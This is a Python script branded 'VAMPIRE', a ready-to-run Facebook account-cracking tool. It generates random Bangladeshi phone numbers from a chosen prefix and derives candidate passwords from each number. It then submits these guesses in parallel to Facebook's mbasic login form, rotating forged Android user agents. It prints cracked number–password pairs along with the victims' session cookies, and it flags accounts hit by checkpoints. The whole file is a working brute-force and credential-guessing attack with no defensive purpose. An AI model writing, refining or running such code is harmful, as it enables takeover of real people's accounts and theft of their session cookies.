import os, random, string, sys, uuid, json, requests,re
from concurrent.futures import ThreadPoolExecutor as imran
#__________COLOURS___________#
#__________CLEAR_____________#
def flash():os.system('clear');print(logo)
#____________LOOPS____________#
loop=0
user=[]
ok=[]
cp=[]
ugen=[]
#____________UGEN_____________#
for x in range(100):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
#____________LINE______________#
def line():print(18 * '<=>')
#____________LOGO_____________#
logo = '''▌ ▌▞▀▖▙▗▌▛▀▖▜▘▛▀▖▛▀▘
▚▗▘▙▄▌▌▘▌▙▄▘▐ ▙▄▘▙▄
▝▞ ▌ ▌▌ ▌▌  ▐ ▌▚ ▌
 ▘ ▘ ▘▘ ▘▘  ▀▘▘ ▘▀▀▘'''
#_____________MENU_____________#
def Main():
    flash()
    print(f' [1] RANDOM ')
    print(f' [2] EXIT ')
    line()
    a = input(f' CHOICE : ')
    if a == '1':
        BANGLADESH()
    elif a == '2':
        exit(f' THANKS FOR USING DEAR ')
    else:
        exit(f' SORRY YOU HAVE NOT SELECTED ANY OPTION ')
#___________MAIN-DEF__________#
def BANGLADESH():
    flash()
    print(f' SIM CODE : 01710 / 01810 / 01910 ')
    line()
    code = input(f' CHOICE CODE : ')
    flash()
    print(f' LIMIT EX : 1000 / 2000 ')
    line()
    limit = int(input(f' LIMIT : '))
    flash()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with imran(max_workers=45) as Imran:
        line()
        for sexy in user:
            uid = code + sexy
            paslist = [uid[5:], uid[4:], uid[3:], uid[2:], uid[1:], uid[0:], uid[:6], uid[:7], uid[:8], uid[:9], uid[:10]]
            Imran.submit(method, uid, paslist)

#___________METHOD___________#
def method(uid, paslist):
    global loop, ok, cp
    sys.stdout.write(f'\r VAMPIRE | %s | OK:%s | CP:%s' % (loop, len(ok), len(cp))), sys.stdout.flush()
    try:
        for pas in paslist:
            sex=random.choice(ugen)
            session=requests.Session()
            free_fb = session.get(f'https://mbasic.facebook.com').text
            data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":pas,"login":"Log In"}
            headers={'Host': 'mbasic.facebook.com',
            'path': '/',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': sex,
            'viewport-width': '980',}
            session.post(url="https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=data,headers=headers,allow_redirects=False).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                print(f'\r [OK] => ' + uid + '|' + pas + '\n [COOKIE] => ' + coki + '')
                ok.append(uid)
                break
            elif 'cheakpoint' in log_cookies:
                print(f'\r [CP] => ' + uid + '|' + pas + '')
                cp.append(uid)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass
#___________END-CALL__________#
Main()